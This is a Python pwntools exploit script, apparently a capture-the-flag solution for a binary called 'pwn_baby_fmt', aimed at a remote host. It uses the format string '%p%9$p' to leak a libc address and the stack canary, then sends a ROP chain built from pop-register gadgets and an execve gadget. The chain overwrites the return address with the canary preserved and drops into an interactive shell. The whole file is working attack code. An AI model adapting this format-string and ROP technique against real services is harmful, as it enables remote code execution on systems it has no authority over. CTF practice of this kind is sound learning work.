from pwn import *

# context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']


env = {"LD_PRELOAD": "./libc.so.6"}
# r = gdb.debug("./pwn_baby_fmt", env=env)
# r = process("./pwn_baby_fmt", env=env)
r = remote('35.198.162.194', 32136)


# Leak random number canary and libc address
format = '%p%9$p'
offset = 0x1ec723

r.recvuntil('town?')
r.sendline(format)

r.recvuntil('Hello stranger. What town is this?\n')

result = r.readline().strip().decode().split('0x')
libc_base = int(result[1], 16) - offset
canary = int(result[2], 16) & 0xffffffff

print('Libc: ' + hex(libc_base))
print('Canary: ' + hex(canary))


# Send rop payload to spawn bash
EBP = libc_base + 0x25000

ADDR_EXECVE = libc_base + 0xe6af4
POP_RDX = libc_base + 0x11c1e1
POP_RSI = libc_base + 0x27529

print('Pop RSI: ' + hex(POP_RSI))


rop = (
        5 * b'A' +
        p32(canary) + 
        0x14 * b'A' +
        p64(EBP) +
        p64(POP_RSI) +
        p64(0) + 
        p64(POP_RDX) +
        p64(0) +
        p64(0) +
        p64(ADDR_EXECVE)
)


r.recvuntil('Can you say hi in Chalcatongo?\n')
r.sendline(rop)

r.interactive()
